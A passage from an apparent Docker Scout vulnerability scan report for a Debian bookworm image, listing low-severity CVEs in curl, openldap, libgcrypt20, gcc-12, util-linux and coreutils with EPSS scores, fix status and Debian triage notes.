<tr><td>Affected range</td><td><code><4.19.0-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.19.0-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.343%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.

---
- libtasn1-6 4.20.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1095406)
https://www.openwall.com/lists/oss-security/2025/02/06/6
https://gitlab.com/gnutls/libtasn1/-/issues/52
https://gitlab.com/gnutls/libtasn1/-/commit/4082ca2220b5ba910b546afddf7780fc4a51f75a (v4.20.0)
https://gitlab.com/gnutls/libtasn1/-/commit/869a97aa259dffa2620dabcad84e1c22545ffc3d (v4.20.0)
https://lists.gnu.org/archive/html/help-libtasn1/2025-02/msg00001.html
https://gitlab.com/gnutls/libtasn1/-/blob/master/doc/security/CVE-2024-12133.md

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 6" src="https://img.shields.io/badge/L-6-fce1a9"/> <!-- unspecified: 0 --><strong>curl</strong> <code>7.88.1-10+deb12u14</code> (deb)</summary>

<small><code>pkg:deb/debian/curl@7.88.1-10%2Bdeb12u14?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-15224?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--15224" src="https://img.shields.io/badge/CVE--2025--15224-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.064%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and asked to do public key authentication, curl would wrongly still ask and authenticate using a locally running SSH agent.

---
- curl 8.18.0-1 (unimportant)
https://curl.se/docs/CVE-2025-15224.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/16d5f2a5660c61cc27bd5f1c7f512391d1c927aa (curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15079?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--15079" src="https://img.shields.io/badge/CVE--2025--15079-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and setting the known_hosts file, libcurl could still mistakenly accept connecting to hosts *not present* in the specified file if they were added as recognized in the libssh *global* known_hosts file.

---
- curl 8.18.0~rc3-1 (unimportant)
https://curl.se/docs/CVE-2025-15079.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/adca486c125d9a6d9565b9607a19dce803a8b479 (rc-8_18_0-3, curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14017?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--14017" src="https://img.shields.io/badge/CVE--2025--14017-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.003%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing multi-threaded LDAPS transfers (LDAP over TLS) with libcurl, changing TLS options in one thread would inadvertently change them globally and therefore possibly also affect other concurrently setup transfers.  Disabling certificate verification for a specific transfer could unintentionally disable the feature for other threads as well.

---
- curl 8.18.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-14017.html
Introduced with: https://github.com/curl/curl/commit/ccba0d10b6baf5c73cae8cf4fb3f29f0f55c5a34 (curl-7_17_0)
Fixed by: https://github.com/curl/curl/commit/39d1976b7f709a516e3243338ebc0443bdd8d56d (rc-8_18_0-1, curl-8_18_0)
Built with OpenLDAP (only affects the legacy LDAP support)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-10966?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--10966" src="https://img.shields.io/badge/CVE--2025--10966-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

curl's code for managing SSH connections when SFTP was done using the wolfSSH powered backend was flawed and missed host verification mechanisms.  This prevents curl from detecting MITM attackers and more.

---
- curl 8.17.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-10966.html
Introduced with: https://github.com/curl/curl/commit/6773c7ca65cf2183295e56603f9b86a5ce816a06 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/b011e3fcfb06d6c0278595ee2ee297036fbe9793 (rc-8_17_0-1)
wolfSSH backend not used in Debian

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0725?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--0725" src="https://img.shields.io/badge/CVE--2025--0725-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.600%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When libcurl is asked to perform automatic gzip decompression of content-encoded HTTP responses with the `CURLOPT_ACCEPT_ENCODING` option, **using zlib 1.2.0.3 or older**, an attacker-controlled integer overflow would make libcurl perform a buffer overflow.

---
- curl 8.12.0+git20250209.89ed161+ds-1 (unimportant)
https://curl.se/docs/CVE-2025-0725.html
Introduced with: https://github.com/curl/curl/commit/019c4088cfcca0d2b7c5cc4f52ca5dac0c616089 (curl-7_10_5)
Fixed by: https://github.com/curl/curl/commit/76f83f0db23846e254d940ec7fe141010077eb88 (curl-8_12_0)
Patch only drops officially support for zlib before 1.2.0.4
Can only be triggered when using ancient runtime zlib of version 1.2.0.3 or older

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2379?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2024--2379" src="https://img.shields.io/badge/CVE--2024--2379-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.205%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libcurl skips the certificate verification for a QUIC connection under certain conditions, when built to use wolfSSL. If told to use an unknown/bad cipher or curve, the error path accidentally skips the verification and returns OK, thus ignoring any certificate problems.

---
- curl 8.7.1-1 (unimportant)
https://curl.se/docs/CVE-2024-2379.html
Introduced by: https://github.com/curl/curl/commit/5d044ad9480a9f556f4b6a252d7533b1ba7fe57e (curl-8_6_0)
Fixed by: https://github.com/curl/curl/commit/aedbbdf18e689a5eee8dc39600914f5eda6c409c (curl-8_7_0)
curl in Debian not built with wolfSSL support

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 5" src="https://img.shields.io/badge/L-5-fce1a9"/> <!-- unspecified: 0 --><strong>openldap</strong> <code>2.5.13+dfsg-5</code> (deb)</summary>

<small><code>pkg:deb/debian/openldap@2.5.13%2Bdfsg-5?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22185?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--22185" src="https://img.shields.io/badge/CVE--2026--22185-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenLDAP Lightning Memory-Mapped Database (LMDB) versions up to and including 0.9.14, prior to commit 8e1fda8, contain a heap buffer underflow in the readline() function of mdb_load. When processing malformed input containing an embedded NUL byte, an unsigned offset calculation can underflow and cause an out-of-bounds read of one byte before the allocated heap buffer. This can cause mdb_load to crash, leading to a limited denial-of-service condition.

---
- openldap <unfixed> (unimportant)
- lmdb <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126287)
[trixie] - lmdb <no-dsa> (Minor issue)
[bookworm] - lmdb <no-dsa> (Minor issue)
[bullseye] - lmdb <postponed> (Minor issue, OOB read)
https://seclists.org/fulldisclosure/2026/Jan/5
https://bugs.openldap.org/show_bug.cgi?id=10421
Fixed by: https://git.openldap.org/openldap/openldap/-/commit/8e1fda85532a3c74276df38a42d234dcdfa1e40d
OpenLDAP bundles lmdb but does not build mdb_load.c

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-15719?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2020--15719" src="https://img.shields.io/badge/CVE--2020--15719-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.216%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libldap in certain third-party OpenLDAP packages has a certificate-validation flaw when the third-party package is asserting RFC6125 support. It considers CN even when there is a non-matching subjectAltName (SAN). This is fixed in, for example, openldap-2.4.46-10.el8 in Red Hat Enterprise Linux.

---
- openldap <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=965184)
https://bugs.openldap.org/show_bug.cgi?id=9266
https://bugzilla.redhat.com/show_bug.cgi?id=1740070
RedHat/CentOS applied patch: https://git.centos.org/rpms/openldap/raw/67459960064be9d226d57c5f82aaba0929876813/f/SOURCES/openldap-tlso-dont-check-cn-when-bad-san.patch
OpenLDAP upstream did dispute the issue as beeing valid, as the current libldap
behaviour does conform with RFC4513. RFC6125 does not superseed the rules for
verifying service identity provided in specifications for existing application
protocols published prior to RFC6125, like RFC4513 for LDAP.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-17740?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2017--17740" src="https://img.shields.io/badge/CVE--2017--17740-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>6.138%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

contrib/slapd-modules/nops/nops.c in OpenLDAP through 2.4.45, when both the nops module and the memberof overlay are enabled, attempts to free a buffer that was allocated on the stack, which allows remote attackers to cause a denial of service (slapd crash) via a member MODDN operation.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi/Incoming?id=8759
nops slapd-module not built

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-14159?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2017--14159" src="https://img.shields.io/badge/CVE--2017--14159-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.158%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

slapd in OpenLDAP 2.4.45 and earlier creates a PID file after dropping privileges to a non-root account, which might allow local users to kill arbitrary processes by leveraging access to this non-root account for PID file modification before a root script executes a "kill `cat /pathname`" command, as demonstrated by openldap-initscript.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi?findid=8703
Negligible security impact, but filed #877512

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2015-3276?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2015--3276" src="https://img.shields.io/badge/CVE--2015--3276-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.575%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The nss_parse_ciphers function in libraries/libldap/tls_m.c in OpenLDAP does not properly parse OpenSSL-style multi-keyword mode cipher strings, which might cause a weaker than intended cipher to be used and allow remote attackers to have unspecified impact via unknown vectors.

---
- openldap <unfixed> (unimportant)
Debian builds with GNUTLS, not NSS

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libgcrypt20</strong> <code>1.10.1-3</code> (deb)</summary>

<small><code>pkg:deb/debian/libgcrypt20@1.10.1-3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-41989?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.10.1-3%2Bdeb12u1"><img alt="low : CVE--2026--41989" src="https://img.shields.io/badge/CVE--2026--41989-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.10.1-3+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.10.1-3+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libgcrypt before 1.12.2 sometimes allows a heap-based buffer overflow and denial of service via crafted ECDH ciphertext to gcry_pk_decrypt.

---
- libgcrypt20 1.12.2-1
[bullseye] - libgcrypt20 <not-affected> (Vulnerable code introduced later)
https://www.openwall.com/lists/oss-security/2026/04/21/1
https://dev.gnupg.org/T8211
Fixed by: https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git;a=commit;h=2d3d732c9bf87cc10729f69678dd9e6862f99fa3 (libgcrypt-1.12.2)
Introduced by: https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git;a=commit;h=bbe15758c893dbf546416c1a6bccdad1ab000ad7 (libgcrypt-1.9.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2236?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2024--2236" src="https://img.shields.io/badge/CVE--2024--2236-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.666%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>72nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.

---
- libgcrypt20 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1065683)
https://bugzilla.redhat.com/show_bug.cgi?id=2268268
https://lists.gnupg.org/pipermail/gcrypt-devel/2024-March/005607.html
https://github.com/tomato42/marvin-toolkit/tree/master/example/libgcrypt
https://people.redhat.com/~hkario/marvin/
https://dev.gnupg.org/T7136
https://gitlab.com/redhat-crypto/libgcrypt/libgcrypt-mirror/-/merge_requests/17
Not in scope for libgcrypt security policy, work ongoing to add support in the protocol layer

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6829?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2018--6829" src="https://img.shields.io/badge/CVE--2018--6829-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.577%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

cipher/elgamal.c in Libgcrypt through 1.8.2, when used to encrypt messages directly, improperly encodes plaintexts, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for Libgcrypt's ElGamal implementation.

---
- libgcrypt20 <unfixed> (unimportant)
- libgcrypt11 <removed> (unimportant)
- gnupg1 <unfixed> (unimportant)
- gnupg <removed> (unimportant)
https://github.com/weikengchen/attack-on-libgcrypt-elgamal
https://github.com/weikengchen/attack-on-libgcrypt-elgamal/wiki
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004394.html
GnuPG uses ElGamal in hybrid mode only.
This is not a vulnerability in libgcrypt, but in an application using
it in an insecure manner, see also
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004401.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>gcc-12</strong> <code>12.2.0-14</code> (deb)</summary>

<small><code>pkg:deb/debian/gcc-12@12.2.0-14?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-4039?s=debian&n=gcc-12&ns=debian&t=deb&osn=debian&osv=12&vr=%3C12.2.0-14%2Bdeb12u1"><img alt="low : CVE--2023--4039" src="https://img.shields.io/badge/CVE--2023--4039-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><12.2.0-14+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>12.2.0-14+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.185%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains  that target AArch64 allows an attacker to exploit an existing buffer  overflow in dynamically-sized local variables in your application  without this being detected. This stack-protector failure only applies  to C99-style dynamically-sized local variables or those created using  alloca(). The stack-protector operates as intended for statically-sized  local variables.  The default behavior when the stack-protector  detects an overflow is to terminate your application, resulting in  controlled loss of availability. An attacker who can exploit a buffer  overflow without triggering the stack-protector might be able to change  program flow control to cause an uncontrolled loss of availability or to  go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.

---
- gcc-13 13.2.0-4 (unimportant)
- gcc-12 12.3.0-9 (unimportant)
[bookworm] - gcc-12 12.2.0-14+deb12u1
- gcc-11 11.4.0-4 (unimportant)
- gcc-10 10.5.0-3 (unimportant)
- gcc-9 9.5.0-6 (unimportant)
- gcc-8 <removed> (unimportant)
- gcc-7 <removed> (unimportant)
https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-x7ch-h5rf-w2mf
Not considered a security issue by GCC upstream
https://developer.arm.com/Arm%20Security%20Center/GCC%20Stack%20Protector%20Vulnerability%20AArch64

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-27943?s=debian&n=gcc-12&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2022--27943" src="https://img.shields.io/badge/CVE--2022--27943-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.046%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.

---
- gcc-12 <unfixed> (unimportant)
Negligible security impact
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105039

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>util-linux</strong> <code>2.38.1-5+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/util-linux@2.38.1-5%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-14104?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--14104" src="https://img.shields.io/badge/CVE--2025--14104-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in util-linux. This vulnerability allows a heap buffer overread when processing 256-byte usernames, specifically within the `setpwnam()` function, affecting SUID (Set User ID) login-utils utilities writing to the password database.

---
- util-linux 2.41.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122058; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2419369
https://github.com/util-linux/util-linux/issues/3585
https://github.com/util-linux/util-linux/pull/3586
Fixed by: https://github.com/util-linux/util-linux/commit/aaa9e718c88d6916b003da7ebcfe38a3c88df8e6
Fixed by: https://github.com/util-linux/util-linux/commit/9a36d77012c4c771f8d51eba46b6e62c29bf572a
Affected code in setpwnam() is only used by chsh and chfn which are not build
in any Debian released binary package from src:util-linux and explicitly configured
as with --disable-chfn-chsh since 2.25-1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>coreutils</strong> <code>9.1-1</code> (deb)</summary>

<small><code>pkg:deb/debian/coreutils@9.1-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5278?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--5278" src="https://img.shields.io/badge/CVE--2025--5278-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.140%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.

---
- coreutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106733; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2368764
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00036.html
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00040.html
https://cgit.git.savannah.gnu.org/cgit/coreutils.git/commit/?id=8c9602e3a145e9596dc1a63c6ed67865814b6633
https://www.openwall.com/lists/oss-security/2025/05/27/2
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=78507
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-18018?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2017--18018" src="https://img.shields.io/badge/CVE--2017--18018-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX "-R -L" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.

---
- coreutils <unfixed> (unimportant)
http://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html
https://www.openwall.com/lists/oss-security/2018/01/04/3
Documentation patches proposed:
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00072.html
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00073.html
Neutralised by kernel hardening

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>xz-utils</strong> <code>5.4.1-0.2</code> (deb)</summary>

